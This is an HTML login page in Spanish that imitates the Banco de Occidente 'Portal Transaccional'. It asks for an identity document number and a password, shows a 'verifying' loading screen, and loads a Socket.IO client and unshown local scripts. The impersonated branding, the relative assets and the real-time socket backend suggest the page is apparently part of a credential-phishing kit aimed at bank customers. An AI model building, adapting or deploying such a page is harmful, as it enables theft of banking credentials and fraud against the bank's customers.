<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de Occidente - Portal Transaccional</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <!-- Seguridad Badge -->
        <div class="security-badge">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L4 6V11C4 16.55 7.84 21.74 13 23C18.16 21.74 22 16.55 22 11V6L12 2ZM10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z" fill="#00C853"/>
            </svg>
            <span>Seguridad</span>
        </div>

        <!-- Main Card -->
        <div class="card">
            <!-- Logo -->
            <div class="logo-container">
                <img src="img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg" alt="Banco de Occidente" class="logo">
            </div>

            <!-- Welcome Text -->
            <div class="welcome-text">
                <p class="welcome">¡Bienvenido! a tu,</p>
                <p class="portal-title">Portal Transaccional</p>
            </div>

            <!-- Tabs -->
            <div class="tabs">
                <button class="tab active" data-tab="registrado">Registrado</button>
                <button class="tab" data-tab="sin-registro">Sin registro</button>
            </div>

            <!-- Tab Content: Registrado -->
            <div class="tab-content active" id="tab-registrado">
                <form class="login-form" id="form-registrado">
                <!-- Identificación Field -->
                <div class="form-group">
                    <label for="identificacion">Identificación</label>
                    <div class="input-with-select">
                        <select class="doc-type" id="tipoDocumento">
                            <option value="CC">CC</option>
                            <option value="CE">CE</option>
                            <option value="NIT">NIT</option>
                            <option value="PA">PA</option>
                        </select>
                            <input type="text" id="numeroDocumento" placeholder="Ej: 1093238993" class="input-field" inputmode="numeric" pattern="[0-9]*" required>
                        </div>
                    </div>                <!-- Contraseña Field -->
                <div class="form-group">
                    <label for="contrasena">Contraseña</label>
                    <div class="password-container">
                        <input type="password" id="contrasena" placeholder="Ingresa tu contraseña" class="input-field" required>
                        <button type="button" class="toggle-password">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C9.24 17 7 14.76 7 12C7 9.24 9.24 7 12 7C14.76 7 17 9.24 17 12C17 14.76 14.76 17 12 17ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z" fill="#B8BCC8"/>
                            </svg>
                        </button>
                    </div>
                </div>

                <!-- Forgot Password Link -->
                <div class="forgot-password">
                    <a href="#">¿Olvidaste tu contraseña?</a>
                </div>

                <!-- Remember Me Checkbox -->
                <div class="remember-me">
                    <input type="checkbox" id="remember">
                    <label for="remember">Recordar mis datos</label>
                </div>

                <!-- Login Button -->
                <button type="button" class="btn-login" id="submitBtn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M10 17L15 12L10 7V17Z" fill="white"/>
                    </svg>
                    Ingresar
                </button>

                <!-- Register Button -->
                <button type="button" class="btn-register">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M15 12C17.21 12 19 10.21 19 8C19 5.79 17.21 4 15 4C12.79 4 11 5.79 11 8C11 10.21 12.79 12 15 12ZM15 14C12.33 14 7 15.34 7 18V20H23V18C23 15.34 17.67 14 15 14Z" fill="#0066CC"/>
                    </svg>
                    Regístrate
                </button>
            </form>
            </div>

            <!-- Tab Content: Sin registro -->
            <div class="tab-content" id="tab-sin-registro">
                <form class="login-form" id="form-sin-registro">
                    <!-- Info Box -->
                    <div class="info-box">
                        <p>Para realizar transacciones <strong>regístrate</strong> en nuestro Portal Transaccional.</p>
                    </div>

                    <!-- Identificación Field -->
                    <div class="form-group">
                        <label for="identificacion-nr">Identificación</label>
                        <div class="input-with-select">
                            <select class="doc-type" id="docTypeNR">
                                <option value="CC">CC</option>
                                <option value="CE">CE</option>
                                <option value="NIT">NIT</option>
                                <option value="PA">PA</option>
                            </select>
                            <input type="text" id="identificacion-nr" placeholder="Ej: 1093238993" class="input-field" inputmode="numeric" pattern="[0-9]*" required>
                        </div>
                    </div>

                    <!-- Register Button -->
                    <button type="button" class="btn-register btn-full">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M15 12C17.21 12 19 10.21 19 8C19 5.79 17.21 4 15 4C12.79 4 11 5.79 11 8C11 10.21 12.79 12 15 12ZM15 14C12.33 14 7 15.34 7 18V20H23V18C23 15.34 17.67 14 15 14Z" fill="#0066CC"/>
                        </svg>
                        Regístrate
                    </button>

                    <!-- Login Button -->
                    <button type="submit" class="btn-login btn-secondary">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M10 17L15 12L10 7V17Z" fill="white"/>
                        </svg>
                        Ingresar sin registro
                    </button>
                </form>
            </div>
        </div>
    </div>

    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-content">
            <img src="img/spinner_occidente.gif" alt="Cargando..." class="loading-spinner">
            <p class="loading-text">Verificando información...</p>
        </div>
    </div>

    <!-- Socket.IO Client -->
    <script src="/socket.io/socket.io.js"></script>
    <script src="/js/banco-utils.js"></script>
    <script src="script-optimized.js"></script>
</body>
</html>
